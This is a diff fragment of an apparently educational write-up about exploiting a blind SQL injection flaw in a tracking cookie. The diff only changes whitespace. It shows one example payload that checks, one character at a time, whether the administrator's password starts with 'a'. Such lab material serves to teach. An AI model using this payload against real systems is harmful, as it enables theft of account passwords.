@@ -33,11 +33,9 @@ Exploit a **Blind SQL Injection** vulnerability within the tracking cookie (`Tra
 Example payload used to verify if the first character of the `administrator` user's password is the letter 'a':
 
 
+
 ```sql
 xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'administrator') = 'a'--
-
-
-
 
 
 
